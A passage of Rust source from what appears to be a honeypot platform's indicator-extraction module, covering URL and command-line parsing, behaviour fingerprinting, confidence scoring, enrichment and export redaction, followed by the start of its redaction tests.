        if let Ok(o) = Observable::sha256(raw) {
            self.push(ty, o.value, false, role, field);
        }
    }

    fn text(&mut self, ty: IocType, raw: &str, max: usize, role: IocRole, field: &str) {
        let raw = raw.trim();
        if raw.is_empty() || too_long(raw, max) || names_canary(raw, self.e) {
            return;
        }
        let (v, redacted) = redact(raw);
        self.push(ty, v, redacted, role, field);
    }

    fn url(&mut self, raw: &str, role: IocRole, field: &str) {
        let raw = raw.trim();
        if names_canary(raw, self.e) || Observable::new(ObservableKind::Url, raw).is_err() {
            return;
        }
        let Some(i) = raw.find("://") else { return };
        let auth_end = raw[i + 3..]
            .find(['/', '?', '#'])
            .map_or(raw.len(), |e| i + 3 + e);
        let lowered = format!(
            "{}{}",
            raw[..auth_end].to_ascii_lowercase(),
            &raw[auth_end..]
        );
        let (v, redacted) = redact(&lowered);
        let host = url_authority(&v).map(host_of).unwrap_or("").to_string();
        // A URL on the decoy's own network, the metadata service or a local
        // name is not attacker infrastructure.
        let internal = match parse_ip(&host) {
            Some(ip) => internal_ip(ip),
            None => internal_name(&host),
        };
        if internal {
            return;
        }
        self.push(IocType::Url, v, redacted, role, field);
        if !host.is_empty() {
            self.host(&host, role, field);
        }
    }

    /// URLs inside free text such as a command line.
    fn urls_in(&mut self, s: &str, role: IocRole, field: &str) {
        let lower = s.to_ascii_lowercase();
        let mut found = 0;
        let mut from = 0;
        while found < MAX_URLS_PER_TEXT {
            let next = ["http://", "https://", "ftp://"]
                .iter()
                .filter_map(|p| lower[from..].find(p).map(|i| from + i))
                .min();
            let Some(start) = next else { break };
            let end = s[start..]
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '\'' | '"' | '<' | '>' | '|' | ';' | '`' | ')')
                })
                .map_or(s.len(), |e| start + e);
            self.url(&s[start..end], role, field);
            found += 1;
            from = end.max(start + 1);
        }
    }

    fn cmdline(&mut self, raw: &str, field: &str) {
        self.text(
            IocType::Cmdline,
            raw,
            MAX_VALUE_CHARS,
            IocRole::PostExploit,
            field,
        );
        if !too_long(raw, MAX_VALUE_CHARS) {
            self.urls_in(raw, IocRole::Stage2, field);
        }
    }
}

/// The command, its subcommand when the capture logs it apart (the Redis
/// emulator writes `data.subcommand` and leaves it out of `data.args`), and
/// the arguments, one token each.
fn command_tokens(e: &CaptureEvent, cmd: &str) -> Vec<String> {
    let mut tokens = vec![cmd.to_string()];
    tokens.extend(text(e, "subcommand").map(str::to_string));
    match e.data.get("args") {
        Some(Value::Array(a)) => tokens.extend(a.iter().filter_map(|x| match x {
            Value::String(s) => Some(s.clone()),
            Value::Number(n) => Some(n.to_string()),
            _ => None,
        })),
        Some(Value::String(a)) => tokens.extend(a.split_whitespace().map(str::to_string)),
        _ => {}
    }
    tokens
}

fn candidates(e: &CaptureEvent, opts: ExtractOptions, out: &mut Vec<Candidate>) {
    let mut s = Sink { e, out };
    let ua = |s: &mut Sink| {
        if let Some((k, v)) = ["user_agent", "ua"]
            .iter()
            .find_map(|k| text(e, k).map(|v| (*k, v)))
        {
            s.text(
                IocType::HttpUa,
                v,
                MAX_UA_CHARS,
                IocRole::Request,
                &format!("data.{k}"),
            );
        }
    };
    match e.channel {
        Channel::Network => s.ip(&e.src.ip, IocRole::Source, "src.ip"),
        Channel::Application => {
            s.ip(&e.src.ip, IocRole::Source, "src.ip");
            if text(e, "method").is_some() {
                if let Some(p) = text(e, "path").filter(|p| p.starts_with('/') && *p != "/") {
                    s.text(
                        IocType::HttpPath,
                        p,
                        MAX_VALUE_CHARS,
                        IocRole::Request,
                        "data.path",
                    );
                }
            } else if let Some(cmd) = text(e, "command") {
                let mut tokens = command_tokens(e, cmd);
                let positional = redact_command(&mut tokens);
                let before = s.out.len();
                s.text(
                    IocType::RequestSubstring,
                    &tokens.join(" "),
                    MAX_VALUE_CHARS,
                    IocRole::Request,
                    "data.command",
                );
                if positional && s.out.len() > before {
                    s.out[before].redacted = true;
                }
            }
            ua(&mut s);
            if opts.store_payloads
                && let Some(b) = text(e, "body")
            {
                s.text(
                    IocType::RequestSubstring,
                    b,
                    MAX_VALUE_CHARS,
                    IocRole::Payload,
                    "data.body",
                );
            }
            if let Some(h) = text(e, "body_sha256") {
                s.sha(
                    IocType::PayloadSha256,
                    h,
                    IocRole::Payload,
                    "data.body_sha256",
                );
            }
            if let Some(p) = e.payload_ref.as_deref().and_then(PayloadRef::parse) {
                s.sha(
                    IocType::PayloadSha256,
                    &p.sha256,
                    IocRole::Payload,
                    "payload_ref",
                );
            }
        }
        Channel::Hook => {
            s.ip(&e.src.ip, IocRole::Source, "src.ip");
            if let Some(p) = text(e, "request_path").filter(|p| p.starts_with('/') && *p != "/") {
                s.text(
                    IocType::HttpPath,
                    p,
                    MAX_VALUE_CHARS,
                    IocRole::Request,
                    "data.request_path",
                );
            }
            if let Some(h) = text(e, "request_slice_sha256") {
                s.sha(
                    IocType::PayloadSha256,
                    h,
                    IocRole::Payload,
                    "data.request_slice_sha256",
                );
            }
            if opts.store_payloads
                && let Some(b) = text(e, "request_slice")
            {
                s.text(
                    IocType::RequestSubstring,
                    b,
                    MAX_VALUE_CHARS,
                    IocRole::Payload,
                    "data.request_slice",
                );
            }
            if let Some(h) = &e.hook {
                if let Some(p) = h.request_slice_ref.as_deref().and_then(PayloadRef::parse) {
                    s.sha(
                        IocType::PayloadSha256,
                        &p.sha256,
                        IocRole::Payload,
                        "hook.request_slice_ref",
                    );
                }
                for l in &h.cmd_lines {
                    s.cmdline(l, "hook.cmd_lines");
                }
                for r in &h.implant_refs {
                    if let Some(p) = PayloadRef::parse(r) {
                        s.sha(
                            IocType::FileSha256,
                            &p.sha256,
                            IocRole::PostExploit,
                            "hook.implant_refs",
                        );
                    }
                }
            }
        }
        Channel::Process => {
            if let Some((k, line)) = ["cmdline", "argv"]
                .iter()
                .find_map(|k| words(e.data.get(*k)).map(|v| (*k, v)))
            {
                s.cmdline(&line, &format!("data.{k}"));
            }
        }
        Channel::Filesystem | Channel::Quarantine => {
            if let Some(h) = text(e, "sha256") {
                s.sha(IocType::FileSha256, h, IocRole::PostExploit, "data.sha256");
            }
            if e.channel == Channel::Quarantine
                && let Some(p) = e.payload_ref.as_deref().and_then(PayloadRef::parse)
            {
                s.sha(
                    IocType::FileSha256,
                    &p.sha256,
                    IocRole::PostExploit,
                    "payload_ref",
                );
            }
        }
        Channel::Dns => {
            if let Some((k, q)) = ["query", "qname"]
                .iter()
                .find_map(|k| text(e, k).map(|v| (*k, v)))
                && !names_canary(q, e)
                && let Some(d) = norm_domain(q)
            {
                let field = format!("data.{k}");
                s.push(
                    IocType::DnsQuery,
                    d.clone(),
                    false,
                    IocRole::Callback,
                    &field,
                );
                s.push(IocType::Domain, d, false, IocRole::Callback, &field);
            }
        }
        Channel::Egress => {
            if text(e, "detector") == Some("beacon") {
                // The beacon listener saw a planted canary used: the source
                // is the attacker, the path is Foiled's own beacon.
                s.ip(&e.src.ip, IocRole::Source, "src.ip");
                ua(&mut s);
                return;
            }
            let method = text(e, "method").map(str::to_ascii_uppercase);
            let role = if method.as_deref() == Some("GET") {
                IocRole::Stage2
            } else {
                IocRole::Callback
            };
            if let Some(d) = &e.dst {
                s.ip(&d.ip, role, "dst.ip");
            }
            if let Some(h) = text(e, "host") {
                s.host(h, role, "data.host");
            }
            if let Some(u) = text(e, "url") {
                s.url(u, role, "data.url");
            } else if let (Some(h), Some(p)) = (text(e, "host"), text(e, "path")) {
                let port = e.dst.as_ref().and_then(|d| d.port);
                let scheme = match text(e, "scheme").map(str::to_ascii_lowercase).as_deref() {
                    Some("https") => "https",
                    Some("http") => "http",
                    _ if port == Some(443) => "https",
                    _ => "http",
                };
                let host = host_of(h);
                let port_part = match port {
                    None | Some(80) | Some(443) => String::new(),
                    Some(p) => format!(":{p}"),
                };
                let path = if p.starts_with('/') {
                    p.to_string()
                } else {
                    format!("/{p}")
                };
                s.url(
                    &format!("{scheme}://{host}{port_part}{path}"),
                    role,
                    "data.host+data.path",
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Behaviour fingerprint
// ---------------------------------------------------------------------------

/// Placeholder for an argument or path part kept out of a fingerprint.
const FOLDED: &str = "*";

/// Protocol commands whose first argument is a subcommand (`CONFIG SET`),
/// not a value. Every other command contributes its verb only, so keys,
/// passwords and payloads never reach a fingerprint.
const SUBCOMMAND_VERBS: &[&str] = &[
    "ACL", "CLIENT", "CLUSTER", "COMMAND", "CONFIG", "DEBUG", "FUNCTION", "MEMORY", "MODULE",
    "OBJECT", "SCRIPT", "XGROUP", "XINFO",
];

/// A short word kept as is in a fingerprint step, or [`FOLDED`]. Anything
/// long, unusual or naming a canary is folded, so attacker-chosen values
/// (secrets, random names, canaries) never appear in steps and never make
/// two runs of the same tool differ.
fn step_word(w: &str, max: usize, e: &CaptureEvent) -> String {
    let ok = !w.is_empty()
        && w.chars().nth(max).is_none()
        && w.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '+' | '~'))
        && !names_canary(w, e);
    if ok {
        w.to_string()
    } else {
        FOLDED.to_string()
    }
}

/// Path segments after which every segment is a credential, user name or
/// one-time value (`/login/<user>`, `/reset/<token>`).
const AUTH_SEGMENTS: &[&str] = &[
    "2fa",
    "account",
    "accounts",
    "activate",
    "api-key",
    "apikey",
    "auth",
    "authenticate",
    "confirm",
    "forgot",
    "invite",
    "key",
    "keys",
    "login",
    "logon",
    "magic",
    "mfa",
    "oauth",
    "otp",
    "password",
    "passwd",
    "profile",
    "reset",
    "secret",
    "session",
    "sessions",
    "signin",
    "sign-in",
    "token",
    "tokens",
    "u",
    "unlock",
    "user",
    "users",
    "verify",
];

/// Shannon entropy of `s` in bits per character.
fn entropy(s: &str) -> f64 {
    let mut counts: BTreeMap<char, u32> = BTreeMap::new();
    let mut n = 0u32;
    for c in s.chars() {
        *counts.entry(c).or_default() += 1;
        n += 1;
    }
    let n = f64::from(n.max(1));
    counts
        .values()
        .map(|&c| {
            let p = f64::from(c) / n;
            -p * p.log2()
        })
        .sum()
}

/// One path segment or parameter name for a fingerprint step: `*` when it
/// varies between runs of the same tool (holds a digit, other than a short
/// version like `v2`, is long or looks random) and otherwise the word.
fn shape_word(w: &str, e: &CaptureEvent) -> String {
    let lower = w.to_ascii_lowercase();
    let version = lower.len() <= 4
        && lower.starts_with('v')
        && lower.len() > 1
        && lower[1..].bytes().all(|b| b.is_ascii_digit());
    let numeric = w.chars().any(|c| c.is_ascii_digit()) && !version;
    let random = w.chars().nth(11).is_some() && entropy(w) >= 3.5;
    if numeric || random || w.chars().nth(32).is_some() {
        FOLDED.to_string()
    } else {
        step_word(w, 32, e)
    }
}

/// Path without query values, at most 16 segments through [`shape_word`],
/// every segment after an [`AUTH_SEGMENTS`] one folded to `*`, plus the
/// sorted query parameter names: `/api/upload?path`, `/login/*`.
fn path_shape(p: &str, e: &CaptureEvent) -> String {
    let (path, query) = p.split_once('?').unwrap_or((p, ""));
    let path = path.split('#').next().unwrap_or("");
    let mut after_auth = false;
    let segments: Vec<String> = path
        .split('/')
        .take(16)
        .map(|seg| {
            if seg.is_empty() {
                String::new()
            } else if after_auth {
                FOLDED.to_string()
            } else {
                after_auth = AUTH_SEGMENTS.contains(&seg.to_ascii_lowercase().as_str());
                shape_word(seg, e)
            }
        })
        .collect();
    let mut shaped = segments.join("/");
    let names: BTreeSet<String> = query
        .split('#')
        .next()
        .unwrap_or("")
        .split('&')
        .filter_map(|kv| kv.split('=').next())
        .filter(|k| !k.is_empty())
        .take(16)
        .map(|k| shape_word(k, e))
        .collect();
    if !names.is_empty() {
        shaped.push('?');
        shaped.push_str(&names.into_iter().collect::<Vec<_>>().join("&"));
    }
    shaped
}

/// Program name of a command line: the first word's basename.
fn program(line: &str, e: &CaptureEvent) -> Option<String> {
    let first = line.split_whitespace().next()?;
    let first = first.trim_matches(|c| matches!(c, '\'' | '"' | '(' | '`'));
    let base = first.rsplit('/').next().unwrap_or(first);
    (!base.is_empty()).then(|| step_word(base, 32, e))
}

/// An attacker-supplied verb (HTTP method, protocol command, DNS type),
/// upper case.
fn verb(v: &str, e: &CaptureEvent) -> String {
    step_word(&v.to_ascii_uppercase(), 24, e)
}

fn stage(s: HookStage) -> &'static str {
    match s {
        HookStage::Trigger => "trigger",
        HookStage::PostExploit => "post_exploit",
        HookStage::Cleanup => "cleanup",
    }
}

/// Normalised steps for one event. Volatile values (addresses, host names,
/// query values, file names) are left out so the same tool gives the same
/// steps from anywhere.
fn steps_for(e: &CaptureEvent) -> Vec<String> {
    let raw: Vec<String> = match e.channel {
        Channel::Application => {
            if let Some(m) = text(e, "method") {
                vec![format!(
                    "http {} {}",
                    verb(m, e),
                    path_shape(text(e, "path").unwrap_or("/"), e)
                )]
            } else if let Some(c) = text(e, "command") {
                // The subcommand as the emulator logged it, else the first
                // argument of commands known to take one. Never other
                // arguments: keys, passwords and payloads stay out.
                let cmd = verb(c, e);
                let sub = text(e, "subcommand").map(|w| verb(w, e)).or_else(|| {
                    SUBCOMMAND_VERBS
                        .contains(&cmd.as_str())
                        .then(|| words(e.data.get("args")))
                        .flatten()
                        .and_then(|a| a.split_whitespace().next().map(|w| verb(w, e)))
                });
                vec![match sub {
                    Some(sub) => format!("cmd {cmd} {sub}"),
                    None => format!("cmd {cmd}"),
                }]
            } else {
                vec![]
            }
        }
        Channel::Hook => match &e.hook {
            Some(h) => std::iter::once(format!(
                "hook {} {}",
                step_word(&h.hook_id, 96, e),
                stage(h.stage)
            ))
            .chain(
                h.cmd_lines
                    .iter()
                    .filter_map(|l| program(l, e))
                    .map(|p| format!("exec {p}")),
            )
            .collect(),
            None => vec![],
        },
        Channel::Process => ["cmdline", "argv"]
            .iter()
            .find_map(|k| words(e.data.get(*k)))
            .and_then(|l| program(&l, e))
            .map(|p| vec![format!("exec {p}")])
            .unwrap_or_default(),
        Channel::Dns => vec![format!("dns {}", verb(text(e, "qtype").unwrap_or("A"), e))],
        Channel::Egress => {
            if text(e, "detector") == Some("beacon") {
                vec!["canary beacon".to_string()]
            } else {
                vec![format!(
                    "egress {}",
                    verb(text(e, "method").unwrap_or("CONNECT"), e)
                )]
            }
        }
        Channel::Filesystem => vec![format!(
            "fs {}",
            step_word(text(e, "op").unwrap_or("write"), 24, e)
        )],
        Channel::Quarantine => vec!["quarantine".to_string()],
        Channel::Network => vec![],
    };
    raw.iter().map(|s| printable(s)).collect()
}

/// The behaviour fingerprint for an attempt that got past probing:
/// `bf1:` plus 32 hex characters of SHA-256 over the normalised steps,
/// in order, with repeats collapsed. `None` for probe-only attempts and
/// for fewer than two steps, which would match every scanner.
fn fingerprint(a: &Attempt, mine: &[&CaptureEvent]) -> Option<Candidate> {
    if a.state == AttemptState::Probe {
        return None;
    }
    let mut keyed: Vec<(i64, u32, Vec<String>, &CaptureEvent)> = mine
        .iter()
        .map(|e| {
            let seq = e.hook.as_ref().map_or(0, |h| h.sequence_no);
            (e.ts, seq, steps_for(e), *e)
        })
        .filter(|k| !k.2.is_empty())
        .collect();
    // Ties on time are broken by the steps themselves, never by event id, so
    // the same behaviour gives the same order whatever ids the sender chose.
    // An event's own steps keep their order (a hook, then its commands).
    keyed.sort_by(|x, y| (x.0, x.1, &x.2).cmp(&(y.0, y.1, &y.2)));
    let mut steps: Vec<String> = Vec::new();
    let mut events: Vec<(i64, String)> = Vec::new();
    'outer: for (ts, _, event_steps, e) in keyed {
        for s in event_steps {
            if steps.last() != Some(&s) {
                if steps.len() == MAX_FINGERPRINT_STEPS {
                    break 'outer;
                }
                steps.push(s);
            }
        }
        events.push((ts, e.event_id.clone()));
    }
    if steps.len() < 2 {
        return None;
    }
    let h = Sha256::digest(format!("{FINGERPRINT_DOMAIN}\n{}", steps.join("\n")).as_bytes());
    Some(Candidate {
        ty: IocType::BehaviourFingerprint,
        value: format!("bf{FINGERPRINT_VERSION}:{}", hex::encode(&h[..16])),
        redacted: false,
        role: IocRole::Behaviour,
        field: "attempt:steps".into(),
        events,
        fingerprint: Some(FingerprintDetail {
            version: FINGERPRINT_VERSION,
            steps,
        }),
    })
}

// ---------------------------------------------------------------------------
// Extraction
// ---------------------------------------------------------------------------

struct Acc {
    ty: IocType,
    value: String,
    redacted: bool,
    roles: BTreeSet<IocRole>,
    first_seen: i64,
    last_seen: i64,
    first_attempt: String,
    events: BTreeSet<(i64, String)>,
    attempts: BTreeSet<String>,
    campaigns: BTreeSet<String>,
    decoys: BTreeSet<String>,
    catalogues: BTreeSet<String>,
    fields: BTreeSet<String>,
    fingerprint: Option<FingerprintDetail>,
    file_ioc_limited: bool,
}

impl Acc {
    fn new(c: &Candidate, a: &Attempt) -> Self {
        let ts = c.events.first().map_or(a.first_seen, |e| e.0);
        Acc {
            ty: c.ty,
            value: c.value.clone(),
            redacted: false,
            roles: BTreeSet::new(),
            first_seen: ts,
            last_seen: ts,
            first_attempt: a.attempt_id.clone(),
            events: BTreeSet::new(),
            attempts: BTreeSet::new(),
            campaigns: BTreeSet::new(),
            decoys: BTreeSet::new(),
            catalogues: BTreeSet::new(),
            fields: BTreeSet::new(),
            fingerprint: None,
            file_ioc_limited: false,
        }
    }

    fn add(&mut self, c: Candidate, a: &Attempt) {
        self.redacted |= c.redacted;
        self.roles.insert(c.role);
        for (ts, id) in c.events {
            if ts < self.first_seen || (ts == self.first_seen && a.attempt_id < self.first_attempt)
            {
                self.first_attempt = a.attempt_id.clone();
            }
            self.first_seen = self.first_seen.min(ts);
            self.last_seen = self.last_seen.max(ts);
            self.events.insert((ts, id));
        }
        self.attempts.insert(a.attempt_id.clone());
        self.campaigns.extend(a.campaign_id.iter().cloned());
        self.decoys.insert(a.decoy_id.clone());
        self.catalogues.insert(a.catalogue_id.clone());
        self.fields.insert(c.field);
        if self.fingerprint.is_none() {
            self.fingerprint = c.fingerprint;
        }
    }
}

fn evidence(
    signal_id: String,
    source: EvidenceSource,
    weight: u8,
    summary: String,
    reference: Option<String>,
) -> Evidence {
    Evidence {
        signal_id,
        source,
        weight,
        summary,
        reference,
    }
}

/// Score the indicator with #27. Evidence: the decoys it was seen at (a
/// decoy has no legitimate users, so this is a catalogue-style prior that
/// never publishes alone), vulnerable-path hooks and signatures in the
/// attempts it was seen in, and the lowest noise score of those attempts.
fn confidence(
    cfg: &ConfidenceConfig,
    id: &str,
    acc: &Acc,
    attempts: &BTreeMap<&str, &Attempt>,
) -> IocConfidence {
    let mut ev = Vec::new();
    for d in acc.decoys.iter().take(MAX_CONFIDENCE_ITEMS) {
        ev.push(evidence(
            format!("decoy:{d}"),
            EvidenceSource::CataloguePrior,
            100,
            format!("seen at decoy {d}, which has no legitimate users"),
            None,
        ));
    }
    let mut noise: Option<u8> = None;
    for aid in acc.attempts.iter().take(MAX_CONFIDENCE_ITEMS) {
        let Some(a) = attempts.get(aid.as_str()) else {
            continue;
        };
        if let Some(h) = a.hook_hits.iter().find(|h| h.stage == HookStage::Trigger) {
            ev.push(evidence(
                format!("hook:{aid}:{}", h.hook_id),
                EvidenceSource::VulnPathHook,
                100,
                format!(
                    "seen in attempt {aid}, where vulnerable-path hook {} fired",
                    h.hook_id
                ),
                Some(h.event_id.clone()),
            ));
        }
        if a.state_history
            .iter()
            .any(|c| c.signal == StateSignal::Matcher)
        {
            ev.push(evidence(
                format!("signature:{aid}"),
                EvidenceSource::Rule,
                100,
                format!("seen in attempt {aid}, where a tier 1 signature matched"),
                None,
            ));
        }
        if let Some(n) = &a.noise {
            noise = Some(noise.map_or(n.score, |m| m.min(n.score)));
        }
    }
    if let Some(n) = noise {
        ev.push(evidence(
            format!("noise:{id}"),
            EvidenceSource::NoiseScore,
            n,
            format!("lowest source noise score across sightings is {n}"),
            None,
        ));
    }
    match score(cfg, LinkKind::AttemptIoc, &acc.first_attempt, id, ev, None) {
        Some(l) => IocConfidence {
            score: l.score,
            band: l.band,
            wording: l.wording,
            publishable: l.publishable,
            evidence: l.evidence,
            caps_applied: l.caps_applied,
        },
        None => IocConfidence {
            score: 0,
            band: Band::Low,
            wording: "we assess as".into(),
            publishable: false,
            evidence: vec![],
            caps_applied: vec![],
        },
    }
}

const MEMORY_ONLY_NOTE: &str = "Post-exploitation activity was seen but no file was captured, so the \
    implant may be memory-resident. File IOCs are limited and no file hash is reported; use the \
    command line, behaviour fingerprint and network callback indicators instead.";
const MEMORY_ONLY_REPORTED_NOTE: &str = "The capture reported a memory-only implant (data.memory_only), so file hashes may not \
     cover it even where a dropper was captured.";

/// Extract IOCs from attempts and the capture events they were built from.
/// `events` may hold other events; only the attempts' are read. The same
/// input always gives the same output.
pub fn extract(
    attempts: &[Attempt],
    events: &[CaptureEvent],
    cfg: &ConfidenceConfig,
    opts: ExtractOptions,
) -> Extraction {
    let by_id: BTreeMap<&str, &CaptureEvent> =
        events.iter().map(|e| (e.event_id.as_str(), e)).collect();
    let attempt_index: BTreeMap<&str, &Attempt> = attempts
        .iter()
        .map(|a| (a.attempt_id.as_str(), a))
        .collect();
    let mut accs: BTreeMap<String, Acc> = BTreeMap::new();
    let mut per_attempt = Vec::new();

    for a in attempts {
        let mut mine: Vec<&CaptureEvent> = a
            .event_ids
            .iter()
            .filter_map(|id| by_id.get(id.as_str()).copied())
            .collect();
        mine.sort_by(|x, y| (x.ts, &x.event_id).cmp(&(y.ts, &y.event_id)));
        mine.dedup_by(|x, y| x.event_id == y.event_id);

        let mut cands = Vec::new();
        for e in &mine {
            candidates(e, opts, &mut cands);
        }
        cands.extend(fingerprint(a, &mine));

        let mut refs: Vec<String> = Vec::new();
        let mut kept: BTreeSet<String> = BTreeSet::new();
        let mut dropped: BTreeSet<String> = BTreeSet::new();
        let mut has_file = false;
        for c in cands {
            // Before the cap: a file hash that is dropped by the cap was
            // still captured, so the attempt is not file-limited.
            has_file |= c.ty == IocType::FileSha256;
            let id = ioc_id(c.ty, &c.value);
            if !kept.contains(&id) {
                if refs.len() >= MAX_IOCS_PER_ATTEMPT {
                    dropped.insert(id);
                    continue;
                }
                kept.insert(id.clone());
                refs.push(id.clone());
            }
            accs.entry(id).or_insert_with(|| Acc::new(&c, a)).add(c, a);
        }

        let memory_only_reported = mine
            .iter()
            .any(|e| e.data.get("memory_only").and_then(Value::as_bool) == Some(true));
        let post = a.state == AttemptState::PostExploitation;
        let file_ioc_limited = memory_only_reported || (post && !has_file);
        let mut notes = Vec::new();
        if post && !has_file {
            notes.push(MEMORY_ONLY_NOTE.to_string());
        }
        if memory_only_reported {
            notes.push(MEMORY_ONLY_REPORTED_NOTE.to_string());
        }
        if !dropped.is_empty() {
            notes.push(format!(
                "{} more indicators were not kept: one attempt keeps at most {MAX_IOCS_PER_ATTEMPT}.",
                dropped.len()
            ));
        }
        if file_ioc_limited {
            for r in &refs {
                if let Some(acc) = accs.get_mut(r) {
                    acc.file_ioc_limited = true;
                }
            }
        }
        per_attempt.push(AttemptIocs {
            attempt_id: a.attempt_id.clone(),
            ioc_refs: refs,
            file_ioc_limited,
            notes,
        });
    }

    let mut iocs: Vec<Ioc> = accs
        .iter()
        .map(|(id, acc)| {
            let sightings = if acc.ty == IocType::BehaviourFingerprint {
                acc.attempts.len()
            } else {
                acc.events.len()
            };
            Ioc {
                ioc_id: id.clone(),
                ioc_type: acc.ty,
                value: acc.value.clone(),
                display: defang(acc.ty, &acc.value),
                roles: acc.roles.iter().copied().collect(),
                origin: IocOrigin::Observed,
                redacted: acc.redacted,
                file_ioc_limited: acc.file_ioc_limited,
                first_seen: acc.first_seen,
                last_seen: acc.last_seen,
                sightings: u32::try_from(sightings).unwrap_or(u32::MAX),
                attempt_ids: acc.attempts.iter().cloned().collect(),
                campaign_ids: acc.campaigns.iter().cloned().collect(),
                decoy_ids: acc.decoys.iter().cloned().collect(),
                catalogue_ids: acc.catalogues.iter().cloned().collect(),
                event_ids: acc
                    .events
                    .iter()
                    .take(MAX_EVENT_REFS)
                    .map(|(_, id)| id.clone())
                    .collect(),
                extracted_from: acc.fields.iter().cloned().collect(),
                enrichment: vec![],
                fingerprint: acc.fingerprint.clone(),
                confidence: confidence(cfg, id, acc, &attempt_index),
            }
        })
        .collect();
    iocs.sort_by(|a, b| {
        (a.first_seen, a.ioc_type, &a.value).cmp(&(b.first_seen, b.ioc_type, &b.value))
    });
    Extraction {
        iocs,
        attempts: per_attempt,
    }
}

/// Fill `ioc_refs` on each attempt from an extraction over the same
/// attempts.
pub fn attach_refs(attempts: &mut [Attempt], extraction: &Extraction) {
    let by_id: BTreeMap<&str, &AttemptIocs> = extraction
        .attempts
        .iter()
        .map(|a| (a.attempt_id.as_str(), a))
        .collect();
    for a in attempts {
        if let Some(x) = by_id.get(a.attempt_id.as_str()) {
            a.ioc_refs = x.ioc_refs.clone();
        }
    }
}

/// Addresses that need ASN context, for the caller to look up.
pub fn address_observables(iocs: &[Ioc]) -> Vec<Observable> {
    let mut out: Vec<Observable> = iocs
        .iter()
        .filter(|i| matches!(i.ioc_type, IocType::Ip | IocType::Ipv6))
        .filter_map(|i| Observable::ip(&i.value).ok())
        .collect();
    out.sort();
    out.dedup();
    out
}

/// Attach ASN and country context (#11) to address IOCs: the newest
/// `asn.*` and `geo.*` Fact per provider and key. Other Facts (reputation)
/// are triage context, not part of the indicator.
pub fn apply_enrichment(iocs: &mut [Ioc], facts: &BTreeMap<Observable, Vec<Fact>>) {
    for i in iocs
        .iter_mut()
        .filter(|i| matches!(i.ioc_type, IocType::Ip | IocType::Ipv6))
    {
        if let Some(fs) = Observable::ip(&i.value).ok().and_then(|o| facts.get(&o)) {
            i.enrichment = context_refs(fs);
        }
    }
}

/// ASN and country refs from an address's Facts: the newest `asn.*` and
/// `geo.*` Fact per provider and key, sorted by provider then key, with
/// provider text escaped.
pub fn context_refs(facts: &[Fact]) -> Vec<EnrichmentRef> {
    let mut newest: BTreeMap<(&str, &str), &Fact> = BTreeMap::new();
    for f in facts
        .iter()
        .filter(|f| f.key.starts_with("asn.") || f.key.starts_with("geo."))
    {
        let k = (f.provider.as_str(), f.key.as_str());
        if newest
            .get(&k)
            .is_none_or(|g| f.observed_at >= g.observed_at)
        {
            newest.insert(k, f);
        }
    }
    newest
        .into_values()
        .map(|f| EnrichmentRef {
            provider: f.provider.clone(),
            key: f.key.clone(),
            value: match &f.value {
                Value::String(s) => Value::String(printable(s)),
                v => v.clone(),
            },
            observed_at: f.observed_at,
            shareable: !is_never_redistribute(&f.provider),
        })
        .collect()
}

/// The refs that may leave the operator's console: never-redistribute
/// providers are dropped, whatever `shareable` says.
pub fn export_refs(refs: &[EnrichmentRef]) -> Vec<EnrichmentRef> {
    refs.iter()
        .filter(|r| r.shareable && !is_never_redistribute(&r.provider))
        .cloned()
        .collect()
}

/// IOCs as they may leave the operator's console (#13, #35, #37): enrichment
/// refs pass through [`export_refs`]. Everything else is already observed by
/// Foiled's own decoys. The CSV export uses the same guard on its ASN
/// columns.
pub fn redact_for_export(iocs: &[Ioc]) -> Vec<Ioc> {
    iocs.iter()
        .cloned()
        .map(|mut i| {
            i.enrichment = export_refs(&i.enrichment);
            i
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::attempt::{DEFAULT_IDLE_GAP_MS, ExtraSignals, build};
    use serde_json::json;

    const T0: i64 = 1_792_285_323_000;

    fn ev(id: &str, ts: i64, channel: &str, src: &str, data: Value) -> Value {
        json!({
            "event_id": id, "ts": ts, "decoy_id": "d1", "catalogue_id": "foiled/demo-app/1.0.0",
            "decoy_kind": "sandbox", "channel": channel, "severity": "info", "tenant_id": "t1",
            "src": {"ip": src}, "data": data
        })
    }

    fn hook(id: &str, ts: i64, src: &str, stage: &str, extra: Value) -> Value {
        let mut v = ev(id, ts, "hook", src, json!({}));
        let mut h = json!({"hook_id": "demo-app.upload-path-traversal",
            "catalogue_id": "foiled/demo-app/1.0.0", "cve_id": "FOILED-DEMO-0001",
            "stage": stage, "sequence_no": 1, "t_offset_ms": 0});
        if let Value::Object(m) = extra {
            for (k, x) in m {
                h[k] = x;
            }
        }
        v["hook"] = h;
        v
    }

    fn parse(vs: Vec<Value>) -> Vec<CaptureEvent> {
        vs.into_iter()
            .map(|v| serde_json::from_value(v).unwrap())
            .collect()
    }

    fn run(events: &[CaptureEvent], opts: ExtractOptions) -> (Vec<Attempt>, Extraction) {
        let attempts = build(events, DEFAULT_IDLE_GAP_MS, &ExtraSignals::new());
        let x = extract(&attempts, events, &ConfidenceConfig::default(), opts);
        (attempts, x)
    }

    fn values(x: &Extraction, ty: IocType) -> Vec<&str> {
        x.iocs
            .iter()
            .filter(|i| i.ioc_type == ty)
            .map(|i| i.value.as_str())
            .collect()
    }

    #[test]
    fn redaction_removes_secrets_and_email_local_parts() {
        let cases = [
            // Query strings and config lines, any case, any position.
            (
                "/login?user=bob&password=hunter2&x=1",
                "/login?user=bob&password=REDACTED&x=1",
            ),
            ("/a?token=abc", "/a?token=REDACTED"),
            ("/a?mytoken=abc", "/a?mytoken=REDACTED"),
            ("/a?PassWord=abc&monkey=1", "/a?PassWord=REDACTED&monkey=1"),
            (
                "/a?db_passwd=x&pass=y&key=z",
                "/a?db_passwd=REDACTED&pass=REDACTED&key=REDACTED",
            ),
            (
                "/a?Api-Key=x&private_key=y&sessid=z",
                "/a?Api-Key=REDACTED&private_key=REDACTED&sessid=REDACTED",
            ),
            (
                "/a?X-Auth-Token=x&basic_auth=y",
                "/a?X-Auth-Token=REDACTED&basic_auth=REDACTED",
            ),
            (
                "/b?X-Amz-Credential=AKIDEXAMPLE&X-Amz-Signature=abc123&X-Amz-Date=1",
                "/b?X-Amz-Credential=REDACTED&X-Amz-Signature=REDACTED&X-Amz-Date=1",
            ),
            ("db_password = hunter2", "db_password = REDACTED"),
            // JSON, with or without spaces around the colon.
            (
